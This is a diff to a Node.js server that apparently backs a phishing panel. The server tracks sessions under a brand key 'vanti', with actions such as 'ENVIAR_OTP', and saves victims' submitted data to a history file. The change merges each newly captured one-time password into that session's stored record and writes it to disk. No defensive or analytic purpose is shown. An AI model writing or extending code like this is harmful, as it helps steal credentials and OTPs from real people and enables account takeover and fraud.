@@ -616,7 +616,15 @@ const server = http.createServer(async (req, res) => {
                 estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosCompletos);
                 ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP');
-                guardarHistorial('vanti', datosCompletos);
+                
+                const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === 'vanti');
+                if (idx !== -1) {
+                    historial[idx].datos = Object.assign({}, historial[idx].datos, { otp });
+                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+                } else {
+                    guardarHistorial('vanti', datosCompletos);
+                }
+
                 json(res, 200, { ok: true, sessionId });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
